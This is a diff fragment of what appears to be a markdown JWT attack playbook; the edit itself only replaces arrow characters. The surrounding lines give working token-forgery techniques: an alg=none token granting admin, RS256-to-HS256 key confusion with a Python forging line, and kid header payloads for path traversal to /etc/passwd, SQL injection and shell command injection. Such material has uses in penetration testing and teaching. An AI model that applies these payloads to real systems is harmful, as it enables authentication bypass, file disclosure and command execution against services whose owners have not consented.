@@ -35,15 +35,15 @@ Analyze:
 #### STEP 2: ALGORITHM CONFUSION ATTACKS
 
 **alg=none attack:**
-1. Change header `"alg": "RS256"` → `"alg": "none"`
+1. Change header `"alg": "RS256"` -> `"alg": "none"`
 2. Remove the signature portion (keep the trailing dot)
 3. Send: `eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.`
 
-**HMAC↔RSA confusion (RS256→HS256):**
+**HMAC<->RSA confusion (RS256->HS256):**
 1. If the server uses RS256 (public/private key) but you have the PUBLIC key
-2. Change `"alg": "RS256"` → `"alg": "HS256"`
+2. Change `"alg": "RS256"` -> `"alg": "HS256"`
 3. Sign the token using the PUBLIC key as the HMAC secret
-4. Server verifies with public key → accepts your forged token
+4. Server verifies with public key -> accepts your forged token
 
 ```python
 import jwt
@@ -57,15 +57,15 @@ token = jwt.encode({"admin": True}, public_key, algorithm="HS256")
 ```json
 {"alg": "HS256", "kid": "../../../../etc/passwd"}
 ```
-→ If server reads kid as a file path to get the key, you might leak files.
+-> If server reads kid as a file path to get the key, you might leak files.
 
 **SQL injection in kid:**
 ```json
 {"alg": "HS256", "kid": "x' UNION SELECT 'secret_key'--"}
 ```
-→ If kid is used in a DB query to fetch the signing key.
+-> If kid is used in a DB query to fetch the signing key.
 
-**kid → command injection (rare):**
+**kid -> command injection (rare):**
 ```json
 {"alg": "HS256", "kid": "| whoami"}
 ```
